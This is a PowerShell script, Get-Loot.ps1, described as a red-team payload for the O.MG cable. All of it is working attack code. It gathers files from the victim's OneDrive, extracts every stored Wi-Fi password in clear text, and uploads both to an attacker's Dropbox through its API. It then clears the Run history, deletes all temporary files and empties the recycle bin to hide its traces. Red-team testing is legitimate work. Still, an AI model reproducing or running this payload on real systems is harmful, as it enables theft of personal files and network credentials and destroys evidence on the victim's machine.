<#
.SYNOPSIS
    This script is intended to run as a payload with the O.MG cable as a red team excercise.
    The script can also be run manually or with other authorities           
    
.DESCRIPTION
    The script currently collects files from a user's OneDrive (if OneDrive is used) and collects the user's wifi profiles.
    The script uploads the collected files to a private DropBox via the DropBox API.

.NOTES
    Filename: Get-Loot.ps1
    Version: 1.0
    Author: Martin Bengtsson
    Blog: www.imab.dk
    Twitter: @mwbengtsson

.LINK
    
#> 
#region Functions
# Create Upload-DropBox function
# This is created based off the Dropbox API documentation
function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    )
    # Grabbing the DropBox access token locally. The access token is delivered prior to running this script
    $accessToken = Get-Content -Path $env:TEMP\at.txt
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $accessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}
# Create Get-WifiProfiles function
function Get-WifiProfiles() {
    # Create empty arrays	
    $wifiProfileNames = @()
    $wifiProfileObjects = @()
    $netshOutput = netsh.exe wlan show profiles | Select-String -Pattern " : "
    foreach ($wifiProfileName in $netshOutput){
        $wifiProfileNames += (($wifiProfileName -split ":")[1]).Trim()
    }
    # Bind the WLAN profile names and also the password to a custom object
    foreach ($wifiProfileName in $wifiProfileNames){
        # Get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
        try {
            $wifiProfilePassword = (((netsh.exe wlan show profiles name="$wifiProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
        }
        Catch {
            $wifiProfilePassword = "The password is not stored in this profile"
        }
        # Build the object and add this to an array
        $wifiProfileObject = New-Object PSCustomobject 
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wifiProfileName
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $wifiProfilePassword
        $wifiProfileObjects += $wifiProfileObject
    }
    Write-Output $wifiProfileObjects
}
#endregion
#region Variables
$computerName = $env:COMPUTERNAME
$OneDriveLoot = "$env:TEMP\imabdk-loot-OneDrive-$computerName.zip"
$wifiProfilesLoot = "$env:TEMP\imabdk-loot-WiFiProfiles-$computerName.txt"
#endregion
#region Script execution
try {
    # Get OneDrive loot if such exist
    if (Test-Path $env:OneDrive) {
        # For testing purposes I limited this to only certain filetypes as well as only selecting the first 10 objects
        $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
        # Zipping the OneDrive content for easier upload to Dropbox
        $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
    }
    # Get Wifi loot
    Get-WifiProfiles | Out-File $wifiProfilesLoot
    # Upload loot to Dropbox
    if ((Test-Path $OneDriveLoot) -OR (Test-Path $wifiProfilesLoot)) {
        Upload-DropBox -SourceFilePath $OneDriveLoot
        Upload-DropBox -SourceFilePath $wifiProfilesLoot
    }
}
catch {
    Write-Output "Script execution failed"
}
finally {
    # Cleanup after script
    # Flush history from run
    Remove-Item -Path "HKCU:\SOftware\Microsoft\Windows\CurrentVErsion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
    # Clear out any temporary files
    Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
    # Empty the recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
#endregion
